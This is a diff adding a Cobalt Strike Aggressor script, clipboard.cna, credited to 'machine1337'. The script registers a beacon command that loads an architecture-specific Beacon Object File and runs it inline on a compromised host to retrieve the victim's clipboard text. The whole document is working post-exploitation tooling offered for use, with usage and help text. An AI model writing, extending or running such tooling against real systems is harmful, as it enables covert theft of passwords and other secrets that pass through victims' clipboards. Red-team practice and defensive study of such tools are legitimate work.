@@ -1,0 +1,57 @@
+#
+# clipboard.cna - Clipboard BOF for Cobalt Strike
+# Usage: clipboard get
+#
+# Features:
+#   - Retrieves clipboard text content
+#   - Supports both Unicode and ANSI text
+# Developed By machine1337
+
+alias clipboard {
+    local('$bid $action $barch $handle $data $args $bof_file');
+    
+    $bid = $1;
+    
+    if (size(@_) != 2) {
+        berror($bid, "Usage: clipboard get|help");
+        return;
+    }
+    
+    $action = $2;
+    
+    if ($action eq "") {
+        berror($bid, "Usage: clipboard get|help");
+        return;
+    }
+    
+    $barch = barch($bid);
+    $bof_file = script_resource("clipboard." . $barch . ".o");
+    
+    if (!-exists $bof_file) {
+        berror($bid, "BOF not found: " . $bof_file);
+        return;
+    }
+    
+    $handle = openf($bof_file);
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    if (strlen($data) == 0) {
+        berror($bid, "BOF file is empty");
+        return;
+    }
+    
+    $args = bof_pack($bid, "z", $action);
+    
+    btask($bid, "clipboard " . $action);
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register("clipboard", "Retrieve clipboard contents", 
+    "Usage: clipboard get|help\n\n" .
+    "Commands:\n" .
+    "  get   - Retrieve clipboard text content\n" .
+    "  help  - Show help menu\n\n" .
+    "Example:\n" .
+    "  clipboard get\n" .
+    "\n[*] Developed By: Machine1337");
